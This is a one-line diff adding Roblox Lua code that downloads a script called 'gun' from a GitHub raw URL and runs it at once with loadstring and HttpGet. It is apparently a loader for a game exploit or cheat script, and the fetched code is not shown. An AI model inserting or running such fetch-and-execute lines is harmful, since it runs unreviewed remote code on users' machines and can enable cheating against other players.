@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Turakan/Turakan/refs/heads/main/gun"))()
